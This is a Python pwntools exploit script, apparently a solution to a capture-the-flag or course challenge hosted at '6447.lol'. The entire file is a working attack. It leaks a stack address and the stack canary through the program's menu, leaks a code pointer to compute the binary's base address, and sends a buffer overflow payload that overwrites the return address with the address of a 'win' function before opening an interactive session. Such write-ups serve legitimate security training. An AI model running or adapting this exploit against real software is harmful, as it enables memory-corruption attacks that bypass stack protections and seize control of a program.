#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 5003

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
break loop
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
### Miscellaneous Helper Functions ###
######################################

def runner(send):
    P.recvuntil(b'[q]uit', drop=True)
    if(send in ['i', 'd', 'p', 'q']):
        P.sendline(send.encode())

def say(length, payload):
    runner('i')
    P.recvuntil(b'len: ', drop=True)
    P.sendline(length)
    P.sendline(payload)

######################################
############## Exploit ###############
######################################

def exploit():
    connect_binary()
    P.recvuntil(b'pointer ', drop=True)
    orig_stk_ptr = int(P.recvline(), 16)
    stk_ptr = p64(orig_stk_ptr + 65)
    leak = p64(orig_stk_ptr + 0x61) # points to main + 40

    log.info("Canary pointer: %x" % (u64(stk_ptr)))
    log.info("Stack pointer: %x" % (orig_stk_ptr))
    log.info("Leak: %x" % (u64(leak)))

    say(str(len(stk_ptr)).encode(), stk_ptr)

    runner('d')
    P.recvline()
    canary = re.search(b': (.*)\n', P.recvline()).group(1)[:8]
    log.info("Canary: %s" % canary)

    say(str(len(leak)).encode(), leak)
    runner('d')
    P.recvline()
    function = P.recvline()[28:36]
    log.info("Function: %s" % function)

    leak = u64(function)
    base = leak - 40 - E.symbols['main']
    win = base + E.symbols['win']
    payload = b'A' * 56 + canary + b"A" * 24 + p64(win)

    say(str(len(payload)).encode(), payload)
    runner('q')
    P.interactive()
    P.close()

if __name__ == '__main__':
    exploit()